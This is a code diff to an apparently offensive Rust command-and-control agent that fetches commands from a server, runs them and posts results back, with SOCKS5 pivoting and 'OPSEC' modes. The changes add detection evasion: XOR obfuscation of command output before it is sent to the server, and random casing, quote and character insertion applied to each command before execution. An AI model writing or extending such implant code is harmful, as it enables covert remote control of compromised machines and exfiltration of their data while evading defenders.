@@ -1,3 +1,4 @@
+use crate::commands::obfuscated::{obfuscate_command, random_case, random_quote_insertion, random_char_insertion, xor_obfuscate};
 use crate::config::AgentConfig;
 use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
@@ -180,13 +181,20 @@ async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_
 }
 
 // Submit result to the server
-async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
+async fn submit_result_with_client(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    command: &str,
+    output: &str
+) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
     info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
+    let obfuscated_output = xor_obfuscate(output, agent_id);
     let data = json!({
         "command": command,
-        "output": output
+        "output": obfuscated_output
     });
 
     let response = client.post(&url)
@@ -282,7 +290,13 @@ pub async fn run_shell(
 
                 // Re-check OPSEC before execution
                 if should_execute_command(&command).await {
-                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+                    let mut obf_cmd = command.clone();
+                    obf_cmd = random_case(&obf_cmd, 0.5);
+                    obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
+                    obf_cmd = random_char_insertion(&obf_cmd, 0.2);
+                    obf_cmd = obfuscate_command(&obf_cmd);
+
+                    let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
                     debug!("[OPSEC] Executing command: {}", command);
 
                     match execute_command(&cmd_parts).await {
@@ -368,12 +382,24 @@ pub async fn handle_command(command: &str) {
                 return;
             }
             // Execute quiet command immediately
-            let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+            let mut obf_cmd = command.to_string();
+            obf_cmd = random_case(&obf_cmd, 0.5);
+            obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
+            obf_cmd = random_char_insertion(&obf_cmd, 0.2);
+            obf_cmd = obfuscate_command(&obf_cmd);
+
+            let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
             execute_command(&cmd_parts).await;
         }
         AgentMode::BackgroundOpsec => {
             // Execute immediately
-            let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+            let mut obf_cmd = command.to_string();
+            obf_cmd = random_case(&obf_cmd, 0.5);
+            obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
+            obf_cmd = random_char_insertion(&obf_cmd, 0.2);
+            obf_cmd = obfuscate_command(&obf_cmd);
+
+            let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
             execute_command(&cmd_parts).await;
             // Drain and execute queued commands
             let mut queue = QUEUED_COMMANDS.lock().unwrap();
